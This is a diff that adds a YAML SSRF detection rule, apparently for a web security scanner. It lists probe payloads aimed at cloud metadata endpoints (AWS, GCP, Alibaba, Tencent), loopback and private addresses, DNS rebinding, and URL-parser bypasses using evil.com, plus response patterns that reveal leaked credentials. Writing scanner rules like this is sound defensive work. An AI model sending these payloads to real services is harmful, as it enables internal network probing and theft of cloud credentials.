@@ -1,0 +1,73 @@
+# SSRF (Server-Side Request Forgery) 检测规则
+name: ssrf
+description: SSRF — 服务端请求伪造
+severity: high
+owasp: "A10:2021 — Server-Side Request Forgery"
+confidence: 0.75
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT]
+  param_types: [query, body]
+  # 只对看起来像 URL 的参数触发
+  param_name_patterns:
+    - ".*url.*"
+    - ".*link.*"
+    - ".*redirect.*"
+    - ".*callback.*"
+    - ".*webhook.*"
+    - ".*endpoint.*"
+    - ".*host.*"
+    - ".*domain.*"
+    - ".*proxy.*"
+    - ".*fetch.*"
+
+payloads:
+  - value: "http://169.254.169.254/latest/meta-data/"
+    description: "AWS 元数据端点"
+  - value: "http://metadata.google.internal/computeMetadata/v1/"
+    description: "GCP 元数据端点"
+  - value: "http://127.0.0.1:80"
+    description: "本地回环地址"
+  - value: "http://localhost:80"
+    description: "localhost"
+  - value: "http://[::1]:80"
+    description: "IPv6 localhost"
+  - value: "http://0.0.0.0:80"
+    description: "0.0.0.0"
+  # 内网探测
+  - value: "http://10.0.0.1:80"
+    description: "内网 10.x"
+  - value: "http://192.168.1.1:80"
+    description: "内网 192.168.x"
+  - value: "http://172.16.0.1:80"
+    description: "内网 172.16.x"
+  # DNS 重绑定
+  - value: "http://127.0.0.1.nip.io:80"
+    description: "nip.io DNS 重绑定"
+  # URL 解析绕过
+  - value: "http://127.0.0.1:80@evil.com"
+    description: "URL 认证部分绕过 (user:pass@host)"
+  - value: "http://evil.com#@127.0.0.1"
+    description: "Fragment 绕过"
+  - value: "http://0x7f000001:80"
+    description: "十六进制 IP 127.0.0.1"
+  - value: "http://2130706433:80"
+    description: "十进制 IP 127.0.0.1"
+  # 云元数据
+  - value: "http://100.100.100.200/latest/meta-data/"
+    description: "阿里云 ECS 元数据端点"
+  - value: "http://metadata.tencentyun.com/latest/meta-data/"
+    description: "腾讯云 CVM 元数据端点"
+
+exploit_indicator:
+  patterns:
+    - "ami-id"
+    - "instance-id"
+    - "security-credentials"
+    - "computeMetadata"
+    - "kube-env"
+  status_codes: [200, 301, 302, 307, 308]
+
+expected_normal: "服务端不应根据用户输入发起任意网络请求"
+reasoning_template: "SSRF 探测: 尝试访问 {payload_value}"
